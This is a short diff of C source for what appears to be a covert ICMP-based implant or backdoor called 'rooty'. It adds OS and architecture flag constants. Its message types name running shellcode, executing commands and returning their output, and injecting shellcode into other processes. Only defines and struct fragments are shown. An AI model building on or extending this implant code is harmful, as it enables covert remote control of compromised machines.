@@ -3,6 +3,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <limits.h>
 #include <signal.h>
 #include <time.h>
 #include <stdint.h>
@@ -19,25 +20,34 @@
 #define MESSAGE_RESPONSE 		      0x00  // Response
 #define MESSAGE_SHELLCODE 		      0x01  // Fork and run the shellcode
 #define MESSAGE_COMMAND 		      0x02  // Run a command and send back the response
-#define MESSAGE_REMOTE_SHELLCODE	   0x04  // Inject shellcode into another process
-#define MESSAGE_WINDOWS_32          0x08  
-#define MESSAGE_LINUX_32            0x10
-#define MESSAGE_FREEBSD_32          0x20
+#define MESSAGE_REMOTE_SHELLCODE	  0x04  // Inject shellcode into another process
+
+#define MESSAGE_ARCH_X64            0x10
+#define MESSAGE_OS_WINDOWS          0x20
+#define MESSAGE_OS_BSD              0x40   
+#define MESSAGE_OS_LINUX            0x80
 
 #ifdef __unix__
    #define BSD
 #endif
 
 #ifdef __linux__
-   #define Linux
+   #define LINUX
+   #define MESSAGE_OS MESSAGE_OS_LINUX
 #endif
 
 #ifdef __MINGW32__
-   #define Windows
+   #define WINDOWS
 #endif
 
 #ifdef __MINGW64__
-   #define Windows
+   #define WINDOWS
+#endif
+
+#if (__WORDSIZE == 64)
+    #define MESSAGE_ARCH MESSAGE_ARCH_X64
+#else
+    #define MESSAGE_ARCH 0
 #endif
 
 #ifdef DEBUG
@@ -90,6 +100,7 @@ typedef struct __attribute__((__packed__)) icmp_hdr {
     } frag;       /* path mtu discovery */
   } un;
 } ICMP_HDR;
+
 
 typedef struct __attribute__((__packed__)) rooty_message {
     uint8_t     key[BLOCK_SIZE];
